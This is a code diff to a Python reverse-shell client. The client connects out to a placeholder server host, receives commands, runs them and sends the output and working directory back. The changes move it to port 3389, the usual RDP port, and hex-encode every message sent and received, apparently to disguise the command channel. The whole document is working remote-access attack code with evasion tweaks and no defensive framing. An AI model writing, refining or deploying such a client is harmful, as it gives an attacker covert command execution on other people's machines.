@@ -1,13 +1,12 @@
-# New Client Draft Python
-
 import socket
 import os
 import subprocess
 import sys
 from time import sleep as wait
+import binascii
 
 SERVER_HOST = 'FF.FF.FF.FF' #host ip
-SERVER_PORT = 1189
+SERVER_PORT = 3389
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
@@ -33,7 +32,7 @@ def connect_to_server(SERVER_HOST=SERVER_HOST,SERVER_PORT=SERVER_PORT):
 			s.connect((SERVER_HOST, SERVER_PORT))
 			# get the current directory
 			cwd = os.getcwd()
-			s.send(cwd.encode())
+			s.send(binascii.hexlify(cwd.encode()))
 			print("connected!")
 			connected=True
 		except:
@@ -42,7 +41,7 @@ def connect_to_server(SERVER_HOST=SERVER_HOST,SERVER_PORT=SERVER_PORT):
 		while(connected):
 			try:
 				# receive the command from the server
-				command = s.recv(BUFFER_SIZE).decode()
+				command = binascii.unhexlify(s.recv(BUFFER_SIZE)).decode()
 				splited_command = command.split()
 				if command.lower() == "exit":
 					# if the command is exit, just break out of the loop
@@ -65,7 +64,7 @@ def connect_to_server(SERVER_HOST=SERVER_HOST,SERVER_PORT=SERVER_PORT):
 				cwd = os.getcwd()
 				# send the results back to the server
 				message = f"{output}{SEPARATOR}{cwd}"
-				s.send(message.encode())
+				s.send(binascii.hexlify(message.encode()))
 			except KeyboardInterrupt:
 				print("Program interrupted.")
 				running=False
@@ -82,4 +81,3 @@ def connect_to_server(SERVER_HOST=SERVER_HOST,SERVER_PORT=SERVER_PORT):
 
 if __name__ == '__main__':
 	connect_to_server()
-#
